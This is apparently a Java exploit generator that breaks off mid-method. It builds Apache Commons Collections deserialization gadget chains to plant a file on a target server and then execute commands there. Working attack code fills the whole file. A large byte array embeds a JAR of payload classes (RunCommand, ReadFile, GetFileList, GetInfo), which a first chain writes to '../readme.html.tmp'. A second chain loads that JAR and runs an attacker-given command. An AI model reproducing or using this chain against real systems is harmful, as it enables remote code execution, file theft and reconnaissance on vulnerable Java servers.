package seriFileUp.test;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.UnsupportedEncodingException;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class GeneratePayload {
	static boolean isUploadTempFile = false;
	byte[] payload = { 80, 75, 3, 4, 20, 0, 8, 0, 8, 0, -100, -77, 34, 72, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 20, 0, 4, 0, 77, 69, 84, 65, 45,
			73, 78, 70, 47, 77, 65, 78, 73, 70, 69, 83, 84, 46, 77, 70, -2,
			-54, 0, 0, -13, 77, -52, -53, 76, 75, 45, 46, -47, 13, 75, 45, 42,
			-50, -52, -49, -77, 82, 48, -44, 51, -32, -27, -30, -27, 2, 0, 80,
			75, 7, 8, -78, Byte.MAX_VALUE, 2, -18, 27, 0, 0, 0, 25, 0, 0, 0,
			80, 75, 3, 4, 20, 0, 8, 0, 8, 0, 124, -77, 34, 72, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 29, 0, 0, 0, 99, 111, 109, 47, 112, 97, 121,
			108, 111, 97, 100, 47, 71, 101, 116, 70, 105, 108, 101, 76, 105,
			115, 116, 46, 99, 108, 97, 115, 115, 117, 84, 77, 108, 27, 69, 20,
			-2, -58, -34, -11, 110, 54, 107, 39, 113, -20, 52, -37, -46, 54,
			37, 37, -79, 99, -89, 46, 1, 66, -79, -45, -46, 36, 77, 90, -125,
			-29, -122, 58, 77, -102, -122, 82, -42, -10, -110, 110, -39, 120,
			45, -17, 58, 34, 32, -44, 75, 15, 28, -71, -95, 114, 65, -100, 44,
			33, -11, 106, -73, -115, 84, 36, -60, 9, 36, -50, 92, -71, 112,
			-30, 14, -67, 16, -34, 108, 76, -2, 107, -55, 51, 111, -34, -68,
			-97, -17, 123, -17, -19, -4, -14, -17, -77, -25, 0, -58, -96, 75,
			-16, 49, 28, 43, -39, 107, -87, -86, -66, 97, -39, 122, 57, 117,
			-43, 112, 103, 77, -53, -56, -103, -114, 43, 65, 96, -24, -66, -81,
			-81, -21, 41, 75, -81, -84, -90, -82, 23, -17, 27, 37, -105, 33,
			48, 97, 86, 76, -9, 18, 67, 52, -106, -37, -67, 45, -72, 53, -77,
			-78, -102, -119, 47, 50, 40, 51, -97, -107, -116, -86, 107, -38,
			21, 71, 66, 7, 67, -17, -82, -43, -50, 13, -125, 48, 109, -105, 13,
			5, 126, -88, 42, 68, 4, 25, -4, -79, -8, -94, -124, 46, 2, 116, 48,
			-22, 84, -35, -76, -54, 70, 77, 65, 8, -86, -124, -16, 62, 84, -37,
			22, 10, 122, -96, -14, 37, -86, -94, 15, -57, 24, 36, -45, -103,
			89, -85, -70, 27, 94, -40, -37, 10, 52, -100, -112, 112, -100, 65,
			-11, 60, 77, 59, -59, 89, -86, 120, 5, 39, 25, 58, 44, 98, 123,
			-61, -74, 93, -121, -95, 39, 22, 95, -55, -19, -75, -55, 112, -33,
			-45, 42, 6, 112, -122, -95, 107, -43, 112, 39, -117, -114, 109,
			-43, 93, 99, 94, 119, -17, 49, 68, 98, -15, -61, 69, -32, 64, 7,
			85, -100, -59, 107, 84, 45, -67, 90, 53, 42, 101, -122, -47, -93,
			-86, 117, 72, -43, -90, -102, -111, 49, -52, -64, -110, 50, -30,
			-76, 125, -63, 3, 38, 120, -103, 2, 92, 26, 85, 113, -114, -93,
			-111, 93, 123, -105, -3, 121, 21, -81, 99, -116, -14, 89, 70, 101,
			-107, 35, 35, -34, 89, 126, -15, -90, -118, -73, 48, 78, 44, -99,
			122, -47, -15, -52, 25, -6, 98, -39, -20, 17, -72, 101, 92, -96,
			108, 95, 114, -58, 9, -66, 100, 84, 76, -16, 98, 118, -102, -50,
			21, -77, 70, -51, -73, 107, 27, 92, Byte.MAX_VALUE, 73, -59, -69,
			59, -123, -29, 69, 114, 100, 76, -110, -25, -118, -116, 105, -38,
			-18, -56, -104, -95, 30, 5, -107, -96, 114, 113, -25, 23, 84, 100,
			92, 101, 8, -19, -41, 41, -112, -111, -96, -70, -26, -52, -118,
			-111, -81, -81, 21, -115, -38, -126, 94, -76, 12, -122, 112, -50,
			46, -23, -42, -94, 94, 51, -7, -71, -83, 20, -36, 123, 38, -11, 72,
			-53, -67, 100, 98, 51, 84, -109, 79, 72, -50, -21, 107, 94, -120,
			67, 4, 25, 124, 78, -111, 7, 120, 89, -39, -87, 126, 53, -61, -87,
			91, 52, -26, 34, -113, 68, -39, -70, 14, -52, 3, 17, 52, -23, -97,
			37, 56, -36, -126, 40, 29, -68, -105, -54, 102, -115, -61, 105,
			-93, -39, 22, 5, -53, -37, 24, 57, 68, 115, 71, 124, 16, -28, 23,
			44, -72, 122, -23, -45, 57, -67, -22, -47, -107, 80, -96, 79, -87,
			96, -41, 107, 37, 99, -42, 75, -44, -67, -121, -22, 57, 30, 2, 103,
			64, 125, 6, -1, 81, 100, 62, 30, -16, 65, -94, -109, 64, 39, 25,
			10, -32, 123, 70, -38, 14, -70, 46, -113, -76, -48, -71, -119, -48,
			114, 11, -35, 115, -101, -24, -95, -67, 55, -97, 104, 34, -14, 8,
			11, 79, -48, -97, 22, -4, -29, 98, 3, -3, 73, 77, -120, -118, 99,
			77, -100, 106, -30, -43, -16, 16, 45, 75, 15, 69, 22, 21, 53, -31,
			-7, -9, 91, Byte.MAX_VALUE, 114, -9, 112, -84, -123, -111, 100, 19,
			73, 63, 95, -102, 72, 9, -27, 38, -34, -32, -42, 111, -45, 66, -86,
			124, 3, -65, 111, 66, 91, 78, -76, -16, 78, 90, 104, 103, 76, -117,
			-1, 11, 1, 77, 104, 34, -3, 8, 119, -7, 126, 49, 45, 105, 98, 56,
			-58, -45, 104, -127, -16, 101, -66, -5, -57, -27, 6, -46, -102, 20,
			-107, -57, 60, 59, 77, 19, -37, -121, 93, 72, 13, -12, 105, -127,
			67, -38, -121, 50, -117, -54, -102, 68, 64, Byte.MAX_VALUE, -42,
			68, 15, 91, -28, 91, 12, 36, 61, -39, -33, -42, -20, 71, 75, 73,
			-9, -40, 5, 60, -69, -64, 1, -69, 41, 110, -57, -87, -26, 61, -10,
			87, -120, -3, 40, -41, -49, -74, -39, 110, 66, 94, 30, 109, -31,
			90, 90, -48, -124, 31, -87, -14, 126, 100, 105, 93, -57, 73, -81,
			11, 2, 117, 68, -91, -114, 68, -88, 27, 39, -88, 31, 3, -24, -60,
			16, -126, -72, 64, -5, 52, -70, 96, -95, -105, 108, 35, 120,
			Byte.MIN_VALUE, 40, -66, -94, -121, -21, 107, -12, -29, 27, -6,
			-64, -66, -61, 113, 52, -56, -29, 49, -59, 121, -126, 83, -8, -115,
			60, -1, -96, -13, 95, 24, -60, -33, 56, -53, 34, -12, -78, -100,
			-58, 16, -101, -96, 87, 98, -110, -98, -120, 37, -116, 48, 29, 9,
			-68, 71, 89, 63, -89, -116, -44, 111, -68, -113, -100, 55, 24, 101,
			-52, 33, 79, -13, -96, -78, 91, -72, -114, 121, -102, -112, 8,
			-101, -57, 7, -92, -13, 83, -44, 28, 110, -96, 64, 56, 7, 73, 94,
			-64, 77, -102, -106, 117, -4, -118, 69, 44, -111, -18, 1, 126, -62,
			45, -14, 16, 9, -37, 83, 44, -109, 20, 32, 116, 55, 113, -101, 60,
			36, -4, Byte.MIN_VALUE, 41, -49, 67, -90, -52, 126, -84, -32, 67,
			-14, -72, 67, 9, -81, -95, 115, -117, 72, 6, 36, 48, 9, 61, 18, 66,
			-34, -6, 17, 3, 34, 47, 112, 126, 11, -105, -47, -79, -1, 74, -13,
			-124, -48, -74, -51, 64, -40, -9, 2, -46, -16, -16, 63, -34, 12,
			-33, -91, 120, 62, 124, -4, 31, 80, 75, 7, 8, 32, 66, -28, 58, 5,
			4, 0, 0, -79, 6, 0, 0, 80, 75, 3, 4, 20, 0, 8, 0, 8, 0, 124, -77,
			34, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 25, 0, 0, 0, 99, 111,
			109, 47, 112, 97, 121, 108, 111, 97, 100, 47, 71, 101, 116, 73,
			110, 102, 111, 46, 99, 108, 97, 115, 115, -115, -108, -39, 82, 19,
			65, 20, -122, -1, 38, -127, 76, -122, 73, 8, 97, 19, 20, 12, 46,
			24, 16, 18, 69, 68, 101, 81, -39, 23, 3, 65, 3, -95, -72, 28, -110,
			38, 12, -107, -52, -92, 122, 38, -108, -71, -9, 61, -84, -14, 33,
			-120, 37, 85, -22, -75, 15, -31, 107, 120, 103, 121, 122, 18, -10,
			-92, -54, 92, 116, -90, -49, -9, -97, -45, -45, -1, -23, -98, 95,
			Byte.MAX_VALUE, -65, 125, 7, 48, -114, 29, 31, -102, 24, 58, 50,
			86, 33, 94, -44, -53, 121, 75, -49, -58, 87, -72, -77, 102, 30, 88,
			62, 120, 25, 66, 71, -6, -79, 30, -49, -21, 102, 46, -98, -36, 63,
			-30, 25, -121, -95, 101, -58, 48, 13, -25, 53, 67, 87, 52, 113, 65,
			83, -114, 48, -52, -36, -12, 112, -102, 65, 93, -6, -104, -31, 69,
			-57, -80, 76, -37, 7, 63, 21, -65, 80, -99, 19, 6, -17, -126, -107,
			-27, 42, 60, -48, 52, 52, 35, -64, -32, -119, 14, -89, 125, 104,
			99, -24, -71, 94, 117, -66, 100, -28, -77, 92, -88, 8, 66, 83, 16,
			102, 104, 91, 39, 69, 36, -51, -123, 77, -91, -90, -4, 126, 73, 58,
			101, -103, 22, 5, -35, 12, -102, 44, 16, 59, -82, 98, 21, -73, -48,
			-25, 67, -17, -107, -67, -92, -54, -74, -61, 11, 26, 110, -29, 14,
			67, 107, -114, 59, 91, -62, 42, 114, -31, -108, 25, -122, -22, -19,
			-22, 102, 72, 46, 57, -96, -31, 46, 34, -28, -120, 94, 44, 114, 51,
			-53, 48, -10, 95, -71, -75, -19, -72, 37, -18, 105, -72, -113, 7,
			12, -118, 99, 85, 33, 67, 103, -76, -50, 114, 10, -122, -56, -78,
			Byte.MIN_VALUE, 26, 80, 21, 68, 25, -38, -109, -12, -74, -70, -61,
			35, -43, -115, -112, 5, 10, 70, 24, 124, -106, 29, 51, -11, 2, 87,
			48, -54, 16, 72, -90, 46, 89, -92, 32, 70, -99, 33, 94, -77, 69,
			-63, 19, -122, 48, 73, -26, 68, -26, -48, 112, -88, -77, 37, -63,
			93, -35, 120, -75, -114, 78, 113, 5, 19, -44, -26, -123, -110, 16,
			-36, 116, 34, 9, 43, 103, -104, -111, 29, -101, 11, 87, 55, -55,
			-32, 47, -47, -92, -74, -30, 75, -122, 110, -55, 34, -85, 86, -127,
			71, 22, 13, 65, 37, 45, 81, 118, -91, 83, 103, -46, 67, 75, 74,
			103, 24, 122, 93, -23, 89, -27, -85, 106, 58, 90, -118, -85, -50,
			26, 66, -63, 91, -122, -127, 69, 126, -96, -105, -14, 78, 100,
			-101, 23, -118, -106, -48, 69, -7, 90, -58, 60, 67, -48, -19, -71,
			97, -59, -100, 66, -47, -51, 91, -92, -122, 75, -65, 102, -49,
			Byte.MAX_VALUE, -46, -69, 101, 82, 94, -115, -87, 80, -48, 73, 71,
			42, 97, -104, 124, -77, 84, -40, -25, 98, 91, -33, -49, 115, 50,
			39, 97, 101, -12, 124, 90, 23, -122, -100, -41, -126, 94, -25, -48,
			-80, -55, -109, 68, -99, 11, 51, -51, -64, 108, -103, 119, -93,
			123, -44, 12, -5, 114, -21, 105, -1, 13, 79, 5, 29, 39, -63, 109,
			-38, 45, 85, -29, 114, -91, 58, -73, -121, 68, 106, -54, 42, -119,
			12, 95, 54, -28, 91, 105, -75, 55, -120, 73, 45, 6, 65, -105, 9,
			-14, 71, 37, -28, -91, 64, 19, 124, 52, -13, -46, 76, -127, 74,
			-31, -49, -12, -36, 76, -1, -3, 35, 21, -76, -98, 34, -72, 87, 65,
			104, 99, 84, 62, -124, -37, 43, -24, 8, 119, 125, 69, -49, 9, -6,
			79, 48, 72, 99, -8, 33, 13, -69, 85, -6, 72, -46, -31, 70, -12,
			-79, -92, 99, -115, 104, 92, -46, -89, -115, -24, 51, 73, -97, 55,
			-94, 47, 36, 125, -43, -120, 78, 75, 58, -37, -120, -66, -111, 116,
			-18, 50, -35, 117, -29, 11, 20, 31, -83, -55, -105, -86, 108, -13,
			20, -54, -34, 88, 5, 43, 83, -34, 94, -17, 15, -78, -84, 9, -85,
			52, 78, 34, 64, -93, -57, 53, 77, 35, 59, 71, -56, -50, 85, -78,
			-14, 0, 126, 124, 34, 67, -65, -96, 21, 63, -119, -4, 38, -35, 31,
			4, 89, -120, -66, 98, 125, 8, 97, -115, -78, 38, -86, 70, 99, 29,
			-17, -36, -114, -12, 35, -127, 13, 106, -124, -58, -38, -79, -119,
			36, 125, 124, 67, -108, -75, 69, 49, 15, -27, 120, -16, 30, 31,
			-36, 70, -91, -36, -43, -73, -1, 1, 80, 75, 7, 8, 62, -40, 0, 31,
			-14, 2, 0, 0, -88, 5, 0, 0, 80, 75, 3, 4, 20, 0, 8, 0, 8, 0, 124,
			-77, 34, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 26, 0, 0, 0, 99,
			111, 109, 47, 112, 97, 121, 108, 111, 97, 100, 47, 82, 101, 97,
			100, 70, 105, 108, 101, 46, 99, 108, 97, 115, 115, 117, 84, 93, 83,
			19, 87, 24, 126, 14, 108, 114, -106, 101, 19, 32, 16, 33, -118, 26,
			75, 91, -62, 71, 76, -75, 21, 105, -30, 23, -96, 88, 107, 64, 11,
			-120, -115, -75, -99, 89, -110, 3, -84, 46, -69, -103, -51, -90,
			-125, 119, -2, -125, 94, -12, 74, 123, -35, -47, 95, -112, -52,
			-104, -103, -10, -78, 51, -3, 45, -3, 1, -67, -86, 125, -33, 77,
			16, 40, -23, 94, -20, -18, 121, -65, -98, -25, 60, -25, 125, -49,
			-97, -1, -68, -5, 13, -64, 101, 124, 47, -47, 35, 48, 82, -10, -10,
			114, 85, -21, -123, -29, 89, -107, -36, -102, -78, 42, -53, -74,
			-93, 36, 52, -127, -63, 103, -42, -113, 86, -50, -79, -36, -99,
			-36, -125, -83, 103, -86, 28, 8, 68, -81, -39, -82, 29, -36, 16,
			72, 102, -118, -121, -34, -11, -64, -73, -35, -99, -62, -44, -90,
			Byte.MIN_VALUE, 113, 103, -65, -84, -86, -127, -19, -71, 53, -119,
			62, -127, -31, -61, -88, 15, 30, 1, 109, -55, -85, 40, 3, -67, 48,
			77, 68, 16, 19, -24, -51, 76, 109, 74, 12, 8, -104, 97, -68, -19,
			-27, -104, -123, -127, 56, -122, 56, 34, 42, 49, 44, 48, -6, 95,
			-60, -59, -70, -19, 84, -108, 111, 32, 1, -109, 99, 79, -103, 24,
			-59, 24, -79, -76, 107, -100, 30, -106, 125, -62, -114, -45, 38,
			-50, -124, 14, -75, 111, -41, 2, 98, 118, 86, 32, 117,
			Byte.MIN_VALUE, 116, -49, -83, -42, 3, 42, -88, -84, 61, -34, -66,
			-14, 37, -50, 31, Byte.MIN_VALUE, 117, -120, 28, 9, 49, 112, 14,
			23, -104, -45, 71, 2, 67, 29, 17, 58, 81, 36, Byte.MIN_VALUE, -114,
			-113, 5, 34, -113, 54, -106, -77, -13, 6, -58, -15, 41, 7, 78, 10,
			76, 31, 6, 30, 41, 85, -24, 38, -95, -60, -108, -64, -87, -125,
			-24, -59, -6, -10, -74, -14, 85, -91, 77, -52, 64, 6, 51, 92, 114,
			-106, -124, 61, 44, -39, 118, 82, 46, 11, 113, -47, 68, 14, -97,
			-47, 86, -83, 106, 85, -71, 21, -127, 108, -73, -109, 58, 97, -22,
			72, 89, -48, 113, 89, 64, 24, -116, -12, -123, -119, 43, -104, 19,
			-48, -119, 107, -91, 104, -69, -92, -25, 72, -26, 100, 102, -127,
			55, 58, 111, -30, 75, 62, -57, 72, -39, -15, 106, -118, -77, -25,
			117, 92, 19, 56, -65, 100, -71, 105, -41, 11, -46, -37, -74, 91,
			73, 7, -69, 42, 29, 88, -2, -114, -30, -75, -93, -14, 125, 125,
			-52, 120, -120, 95, 55, 77, -36, 10, -63, 2, -81, 93, 86, -57, 34,
			117, 96, -52, -120, 25, -41, 63, 60, 49, 67, -57, 109, -127, -8,
			113, -101, 1, 29, 67, 2, 3, 76, 113, -75, -66, -73, -91, -4, 13,
			107, -117, 79, 63, 81, -12, -54, -106, -77, 105, -7, 54, -81, 59,
			70, 45, -40, -75, 107, -92, 112, -79, 91, -37, 23, -120, 0, 51,
			123, 104, 5, -69, -100, Byte.MAX_VALUE, 98, -81, -108, -65, 29,
			118, 86, -4, -8, -55, 11, -60, 106, 71, 117, -92, -10, -6, 95,
			-119, -87, 6, 43, 42, 112, -90, 91, 83, 116, 14, -109, 16, -74,
			-114, -99, -67, -64, 88, -79, 123, 87, 80, -84, 116, 104, -17, 27,
			-5, 60, -96, -66, -86, -43, 29, -6, 17, 68, 50, 89, -20, 50, 125,
			-52, 117, 61, -80, -54, -49, 87, -84, 106, -88, -119, -60, -109,
			99, -77, -34, 102, 75, -93, -68, -18, -43, -3, -78, 106, 79, 82,
			-20, 64, -94, -117, 28, -120, 11, -96, -31, 2, 63, -124, -60, 3,
			-118, 30, 72, 90, 105, -76, -46, 97, -112, -7, 39, -78, -78, -27,
			-19, 116, 19, -3, 45, -60, 75, 51, 77, 12, -82, -76, -112, 40, 53,
			49, -78, 58, -37, 64, -14, 21, -42, -24, -109, 122, -123, -5, 45,
			-116, -105, 90, 56, 87, -102, 109, 34, -99, -104, 104, -30, -109,
			-68, -42, 66, -90, -108, -46, -102, -104, -50, 71, 68, 62, -6, 6,
			3, -39, 84, -76, -127, 108, -30, 18, -67, 30, -89, 34, 13, 124, 94,
			-54, 71, -1, 120, -1, 87, 74, 107, -32, 42, -81, -13, 111, 48,
			-106, -27, -14, -119, 66, 19, -41, 103, 40, -84, -127, 27, 28, 28,
			-38, 22, -56, -42, 49, 36, -106, -38, 62, -58, -48, 67, -116, 59,
			-7, 72, 42, -14, 59, 113, -19, -59, 50, -67, -65, -90, 118, 4, -79,
			-41, -120, Byte.MAX_VALUE, -116, 118, -109, 68, 31, 38, -48, -113,
			73, -104, -72, 68, -33, 57, -78, 46, -48, -91, 114, 27, 3, -72,
			-117, 65, -84, -45, -9, 7, -54, 41, 99, 24, -49, -23, 2, 122, -119,
			20, 94, -29, 52, 126, -91, 59, -25, 46, 85, 122, 74, -7, -92, 3,
			-66, -62, -67, 80, -79, -73, -124, 112, -97, 116, -118, -31, 23,
			20, -79, 66, -54, 37, -15, 51, 86, -15, Byte.MIN_VALUE, -16, -25,
			104, -28, 30, -30, 27, -62, 94, -64, 52, -42, -88, 118, -124, 112,
			38, -79, 65, 25, 81, -86, 26, -57, 35, -6, -45, -88, 118, 47, 54,
			-15, -104, -68, -33, 82, -59, 9, 104, -17, 9, 74, 74, 8, -119,
			-110, 68, 92, 34, 33, 49, 46, -111, -95, 37, -48, -1, 55, 70, 71,
			8, -16, 59, 10, -19, -63, -45, Byte.MAX_VALUE, 1, 80, 75, 7, 8, 43,
			-86, -127, 113, -126, 3, 0, 0, 0, 6, 0, 0, 80, 75, 3, 4, 20, 0, 8,
			0, 8, 0, 124, -77, 34, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 28,
			0, 0, 0, 99, 111, 109, 47, 112, 97, 121, 108, 111, 97, 100, 47, 82,
			117, 110, 67, 111, 109, 109, 97, 110, 100, 46, 99, 108, 97, 115,
			115, -115, 84, -37, 82, 19, 65, 16, 61, -109, -37, -60, 101, 3, 33,
			120, 33, 40, -32, -99, 69, 46, 81, 20, -59, 4, 81, -63, 27, 26, 46,
			18, 69, -93, -14, -80, -39, 12, -72, -72, -39, 77, 109, 54, 22,
			126, -111, Byte.MAX_VALUE, -112, 88, -90, 74, 31, -83, -14, 91, -4,
			2, 31, -60, -98, 36, -112, 80, 73, -107, 110, -86, 38, 51, -35, 61,
			-89, -49, -23, -98, -103, -97, Byte.MAX_VALUE, -66, 126, 3, 48,
			-125, 45, 14, 31, -61, 73, -61, 41, 36, -118, -6, 39, -53, -47,
			-13, -119, -115, -78, -67, -28, 20, 10, -70, -99, -25, 8, 48, 68,
			119, -11, -113, 122, -62, -46, -19, -99, -60, 90, 110, 87, 24, 30,
			67, 104, -34, -76, 77, 111, -127, -31, -124, -106, 110, 121, 51,
			-98, 107, -38, 59, -87, -15, 77, 6, -27, -31, -98, 33, -118, -98,
			-23, -40, 37, -114, 99, 12, 3, -83, -88, 67, 15, 67, 96, -55, -55,
			11, 5, 126, -88, 42, -126, -120, 48, -8, -75, -15, 77, 5, 125, -24,
			-25, -120, 50, -12, -73, 54, 17, 37, -49, 44, 8, 21, 49, 12, 16,
			-6, -114, -16, -102, 22, 73, 97, 60, -35, 17, -104, -110, 40, 39,
			84, -100, -60, 41, 74, 35, -10, -124, -63, 48, -42, -115, 107,
			-101, 105, -35, 117, 12, 81, 42, -91, 56, -30, 84, -112, -70, -35,
			116, 18, -117, -27, -19, 109, -31, -118, -4, -122, -48, -13, -62,
			-27, 56, -51, 16, 63, -16, 45, -37, -59, -78, 71, 72, 66, 47, 52,
			-36, 10, -122, 49, -54, 49, 114, -124, 123, 19, 87, -59, 89, -100,
			99, -24, 37, -18, 109, -5, 24, 78, 29, -16, 63, 10, 72, 10, -122,
			112, 65, -42, -27, 34, -61, -96, -42, 53, 68, 22, 107, 16, -105,
			101, -48, 24, -43, -72, 21, -44, 96, 67, 126, -114, -15, 3, 45,
			109, -78, 27, -102, 20, 104, 80, -27, 48, -87, 98, 10, -45, -44,
			85, -67, 88, 20, 118, -98, 97, -14, 31, -107, 106, 71, 73, -123,
			113, -107, -127, 41, -110, -55, -116, -118, -21, -72, -63, 16, 38,
			118, -7, -76, 105, 83, 119, -114, 107, -99, 27, -87, -62, 55, 73,
			119, 39, -98, 105, 17, -21, 48, -26, -88, 74, 17, 37, -94, -36, 57,
			-4, 20, -52, 34, 41, 101, -122, 36, -33, 121, 21, 119, -22, 105,
			60, -89, -79, 83, -70, -17, 74, 17, -9, 24, -90, -2, -109, 123, 61,
			23, -111, 95, 100, 80, 91, -119, 34, -118, -60, -102, -105, 98, 30,
			-86, 120, 36, -49, 100, -48, -80, -100, 18, -99, -46, 48, -110, 12,
			125, 82, -43, 106, -71, -112, 19, -18, 11, 61, 103, -111, -64, 88,
			-38, 49, 116, 107, 83, 119, 77, -71, 110, 26, 3, -34, 123, -77, 68,
			109, 75, 119, -65, 86, 41, 6, 110, 52, -90, 18, -96, -125, 47, 1,
			20, -23, -48, 80, 75, -69, 28, 79, 6, 95, -50, -107, -40, -35, 79,
			-88, -12, -105, 114, -121, -2, -50, 126, 17, -72, 85, 111, 77, -56,
			21, -91, -78, 69, -73, -103, -55, 91, -108, -18, 114, 67, 41, 54,
			-110, -15, 116, -29, -61, -118, 94, -84, 43, -29, 120, 115, -28,
			61, 104, 0, -45, -123, -52, 56, 101, -41, 16, -113, 76, 41, -66,
			-81, 37, 116, 90, -122, -30, 28, -24, 102, 67, 126, -108, 75, 54,
			17, 62, 112, 90, 5, 104, 21, -122, 66, -26, 89, -78, -122, -55,
			-30, 92, -87, -94, -25, 11, 122, 39, 42, 56, -66, 82, -61, 96, -74,
			-122, -95, -20, 100, 5, 103, -86, 56, 95, -59, -91, -43, 26, -76,
			108, 21, 87, -110, -127, -49, -120, -58, 3, -15, 96, 5, 19, -79, 4,
			13, -81, -90, 42, -72, -106, 77, 6, Byte.MAX_VALUE, -20, -1, -86,
			97, 54, 27, -69, 85, -59, -19, 120, -96, -126, 84, 5, 11, -79, -5,
			52, 84, -80, -108, 12, 81, -48, -125, 26, -62, -39, 120, -88, -118,
			-57, 73, 30, -25, -33, 41, -91, 31, 79, 104, -100, 70, 79, -99, 80,
			Byte.MIN_VALUE, -56, -87, 68, 110, -108, -24, 104, 68, 109, -126,
			86, 115, -12, -65, -120, 94, 108, -47, -109, -94, 35, 10, 11, -3,
			88, -90, -24, 119, 56, 38, 41, -29, 41, -98, -43, -59, 57, 72, 99,
			-123, 36, -87, 48, -80, -118, 53, 18, 57, -118, 117, -6, 61, -89,
			28, 26, 30, 99, 3, 25, -62, -97, 64, 4, 47, 40, 46, -120, -69, -72,
			-38, -100, 109, -47, -77, -10, -110, 102, 33, -62, -10, 99, 19,
			-81, -120, -63, 107, 66, 28, -127, 111, -97, 54, -124, 56, 24, 71,
			-106, 99, -104, 99, -112, 67, -93, 57, -16, -101, -14, 48, -68,
			-91, 40, 31, -34, -3, 5, 80, 75, 7, 8, -110, 100, -38, 93, 39, 3,
			0, 0, -50, 5, 0, 0, 80, 75, 1, 2, 20, 0, 20, 0, 8, 0, 8, 0, -100,
			-77, 34, 72, -78, Byte.MAX_VALUE, 2, -18, 27, 0, 0, 0, 25, 0, 0, 0,
			20, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 77, 69, 84,
			65, 45, 73, 78, 70, 47, 77, 65, 78, 73, 70, 69, 83, 84, 46, 77, 70,
			-2, -54, 0, 0, 80, 75, 1, 2, 20, 0, 20, 0, 8, 0, 8, 0, 124, -77,
			34, 72, 32, 66, -28, 58, 5, 4, 0, 0, -79, 6, 0, 0, 29, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0, 0, 97, 0, 0, 0, 99, 111, 109, 47, 112, 97,
			121, 108, 111, 97, 100, 47, 71, 101, 116, 70, 105, 108, 101, 76,
			105, 115, 116, 46, 99, 108, 97, 115, 115, 80, 75, 1, 2, 20, 0, 20,
			0, 8, 0, 8, 0, 124, -77, 34, 72, 62, -40, 0, 31, -14, 2, 0, 0, -88,
			5, 0, 0, 25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -79, 4, 0, 0,
			99, 111, 109, 47, 112, 97, 121, 108, 111, 97, 100, 47, 71, 101,
			116, 73, 110, 102, 111, 46, 99, 108, 97, 115, 115, 80, 75, 1, 2,
			20, 0, 20, 0, 8, 0, 8, 0, 124, -77, 34, 72, 43, -86, -127, 113,
			-126, 3, 0, 0, 0, 6, 0, 0, 26, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			0, -22, 7, 0, 0, 99, 111, 109, 47, 112, 97, 121, 108, 111, 97, 100,
			47, 82, 101, 97, 100, 70, 105, 108, 101, 46, 99, 108, 97, 115, 115,
			80, 75, 1, 2, 20, 0, 20, 0, 8, 0, 8, 0, 124, -77, 34, 72, -110,
			100, -38, 93, 39, 3, 0, 0, -50, 5, 0, 0, 28, 0, 0, 0, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, -76, 11, 0, 0, 99, 111, 109, 47, 112, 97, 121,
			108, 111, 97, 100, 47, 82, 117, 110, 67, 111, 109, 109, 97, 110,
			100, 46, 99, 108, 97, 115, 115, 80, 75, 5, 6, 0, 0, 0, 0, 5, 0, 5,
			0, 106, 1, 0, 0, 37, 15 };
	
	private static final GeneratePayload instance = new GeneratePayload();

	public static GeneratePayload getInstance() {
		return instance;
	}

	public byte[] writeTempClassFile() throws Exception {
		String tempFile = "file:../readme.html.tmp";

		Transformer[] transformers = {
				new ConstantTransformer(FileOutputStream.class),
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { String.class } }),
				new InvokerTransformer("newInstance",
						new Class[] { Object[].class },
						new Object[] { new String[] { tempFile } }),
				new InvokerTransformer("write", new Class[] { byte[].class },
						new Object[] { this.payload }) };
		Transformer transformerChain = new ChainedTransformer(transformers);
		Map innermap = new HashMap();
		innermap.put("value", "value");
		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
		Class cls = Class
				.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cls.getDeclaredConstructor(new Class[] {
				Class.class, Map.class });
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(new Object[] { Retention.class,
				outmap });
		ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
		ObjectOutputStream out = new ObjectOutputStream(bo);
		out.writeObject(instance);
		out.flush();
		out.close();
		return bo.toByteArray();
	}

	public byte[] getPayload(String command) throws Exception {
		String ClassPath = "file:../readme.html.tmp";
		Transformer[] transforms = {
				new ConstantTransformer(URLClassLoader.class),
				//getConstructor classname
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { URL[].class } }), //?
				//newinstance file:../readme.html.tmp
				new InvokerTransformer(
						"newInstance",
						new Class[] { Object[].class },
						new Object[] { new Object[] { new java.net.URL[] { new URL(
								ClassPath) } } }), // ??
				//loadClass com.payload.RunCommand
				new InvokerTransformer("loadClass",
						new Class[] { String.class },
						new Object[] { "com.payload.RunCommand" }),
				//?
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { String.class } }), //
				//invoke
				new InvokerTransformer("newInstance",
						new Class[] { Object[].class },
						new Object[] { new String[] { command } }) }; //
		
		Transformer transformerChain = new ChainedTransformer(transforms);
		Map innermap = new HashMap();
		innermap.put("value", "value");
		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
		Class cls = Class
				.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cls.getDeclaredConstructor(new Class[] {
				Class.class, Map.class });
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(new Object[] { Retention.class,
				outmap });
		ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
		ObjectOutputStream out = new ObjectOutputStream(bo);
